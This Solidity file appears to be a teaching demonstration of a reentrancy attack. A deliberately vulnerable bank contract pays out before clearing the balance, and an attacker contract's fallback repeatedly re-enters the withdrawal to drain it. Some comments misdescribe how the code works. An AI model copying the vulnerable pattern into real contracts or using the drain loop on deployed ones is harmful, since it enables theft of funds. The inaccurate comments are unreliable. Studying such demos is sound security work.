// SPDX-License-Identifier: glp-3.0
pragma solidity 0.8.30;

contract Victima {
    // defensive devolpment 
    // five topic for a good development strategies
    // 1. minimalism and simplicity for security
    // 2. code reutilization 
    // 3. quality code 
    // 4. legibility and auditable, clear and readable code
    // 5. Test coverage

    // Reingreso

    //if this is like a bank this balances is the papper fiat
    mapping (address => uint) public balances;

    function deposito() external payable {
        // when we do deposito ETH is on the air, 
        // so the function fallback put the ETH inside the contract like a security meassure 
        balances[msg.sender] += msg.value;
    }

    function reitoDeDinero() external {
        //check if the wallet have ETH by the register of balances,
        //so if the wallet that fallback in contract ETH have balance,
        //then the contract send the ETH to the wallet back
        //update the qty of ETH in the registers
        uint balancePersonal = balances[msg.sender];
        require(balancePersonal > 0, "Tu balance es menos de cero!");
        (bool enviarDineroAlPropietario,) = msg.sender.call { value: balancePersonal}("");
        require(enviarDineroAlPropietario == true, "No se pudo enviar el dinero");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint){
        //view how much ETH the wallet deposit into the contract
        //this is the reality of the boveda in the bank
        return address(this).balance;
    }

    fallback() external payable { 

    }


}

contract Atacante {
    Victima victimaContract;
    constructor(Victima _victimContract){
        victimaContract = Victima(_victimContract);
    }
    
    function getBalance() public view returns(uint){
        return address(this).balance;
    }

    function depositoAtacante() external payable {
        //we can call deposito because is the same external payable
        require(msg.value >=1 ether, "< 1 eeth");
        victimaContract.deposito{value: 1 ether}();
    }

    function retiroDelAtacante() external {
        victimaContract.reitoDeDinero();
    }

//    fallback() external payable { 
//   }

    function ataque() external payable {
        require(msg.value >= 1 ether, "< 1 eth");
        victimaContract.deposito{value: 1 ether}();
        victimaContract.reitoDeDinero();
    }

    fallback() external payable { 
        uint balanceVictima = address(victimaContract).balance;
        if (balanceVictima > 0){
            victimaContract.reitoDeDinero();
        }
    }
}